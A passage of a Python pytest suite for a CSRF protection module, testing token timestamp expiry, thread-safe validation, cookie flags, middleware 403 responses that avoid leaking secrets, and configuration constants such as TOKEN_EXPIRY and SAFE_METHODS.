        token = f"{payload}.{signature}"
        # Should fail on timestamp validation
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_very_old_timestamp_rejected(self, csrf_module, secret_key):
        """Very old timestamp (year 2000) should be rejected."""
        old_timestamp = "946684800"  # Jan 1, 2000
        random_data = secrets.token_hex(32)
        payload = f"{old_timestamp}.{random_data}"
        signature = hmac.new(
            secret_key.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()
        token = f"{payload}.{signature}"
        assert csrf_module["validate_csrf_token"](token, secret_key) is False

    def test_concurrent_validation_thread_safe(self, csrf_module, secret_key):
        """Token validation should be thread-safe."""
        import concurrent.futures

        tokens = [csrf_module["generate_csrf_token"](secret_key) for _ in range(50)]

        def validate(token):
            return csrf_module["validate_csrf_token"](token, secret_key)

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(validate, tokens))

        assert all(results), "All tokens should be valid in concurrent validation"


# ============================================================================
# Test: Cookie Security Flags
# ============================================================================

class TestCookieSecurityFlags:
    """Tests for CSRF cookie security configuration."""

    def test_set_csrf_cookie_returns_token(self, csrf_module, secret_key):
        """set_csrf_cookie should return the token for convenience."""
        mock_response = MagicMock()
        token = csrf_module["generate_csrf_token"](secret_key)

        result = csrf_module["set_csrf_cookie"](mock_response, token)
        assert result == token

    def test_set_csrf_cookie_calls_set_cookie(self, csrf_module, secret_key):
        """set_csrf_cookie should call response.set_cookie with correct params."""
        mock_response = MagicMock()
        token = csrf_module["generate_csrf_token"](secret_key)

        csrf_module["set_csrf_cookie"](mock_response, token)

        mock_response.set_cookie.assert_called_once()
        call_kwargs = mock_response.set_cookie.call_args[1]

        assert call_kwargs["key"] == "csrf_token"
        assert call_kwargs["value"] == token
        assert call_kwargs["httponly"] is True
        assert call_kwargs["path"] == "/"
        assert call_kwargs["max_age"] == 3600  # TOKEN_EXPIRY


# ============================================================================
# Test: Middleware Error Handling
# ============================================================================

class TestMiddlewareErrorHandling:
    """Tests for middleware error handling and logging."""

    def test_middleware_logs_missing_token(self, client, caplog):
        """Middleware should log when CSRF token is missing."""
        import logging
        with caplog.at_level(logging.WARNING):
            response = client.post("/test-post")
            assert response.status_code == 403

    def test_middleware_logs_invalid_token(self, client, tampered_token, valid_token, caplog):
        """Middleware should log when CSRF token is invalid."""
        import logging
        with caplog.at_level(logging.WARNING):
            response = client.post(
                "/test-post",
                headers={"X-CSRF-Token": tampered_token},
                cookies={"csrf_token": valid_token}
            )
            assert response.status_code == 403

    def test_error_response_does_not_leak_secrets(self, client, tampered_token, valid_token):
        """Error responses should not expose internal details."""
        response = client.post(
            "/test-post",
            headers={"X-CSRF-Token": tampered_token},
            cookies={"csrf_token": valid_token}
        )

        data = response.json()
        # Should not contain secret key or internal paths
        response_str = str(data)
        assert TEST_SECRET_KEY not in response_str
        assert "traceback" not in response_str.lower()
        assert "exception" not in response_str.lower()


# ============================================================================
# Test: Token Constant Values
# ============================================================================

class TestTokenConstants:
    """Tests for CSRF token configuration constants."""

    def test_token_expiry_is_one_hour(self, csrf_module):
        """TOKEN_EXPIRY should be 3600 seconds (1 hour)."""
        assert csrf_module["TOKEN_EXPIRY"] == 3600

    def test_cookie_name_constant(self, csrf_module):
        """COOKIE_NAME should be 'csrf_token'."""
        assert csrf_module["COOKIE_NAME"] == "csrf_token"

    def test_safe_methods_include_get_head_options(self, csrf_module):
        """SAFE_METHODS should include GET, HEAD, OPTIONS."""
        assert "GET" in csrf_module["SAFE_METHODS"]
        assert "HEAD" in csrf_module["SAFE_METHODS"]
        assert "OPTIONS" in csrf_module["SAFE_METHODS"]

    def test_safe_methods_exclude_post_put_delete(self, csrf_module):
        """SAFE_METHODS should not include POST, PUT, DELETE."""
        assert "POST" not in csrf_module["SAFE_METHODS"]
        assert "PUT" not in csrf_module["SAFE_METHODS"]
        assert "DELETE" not in csrf_module["SAFE_METHODS"]
        assert "PATCH" not in csrf_module["SAFE_METHODS"]
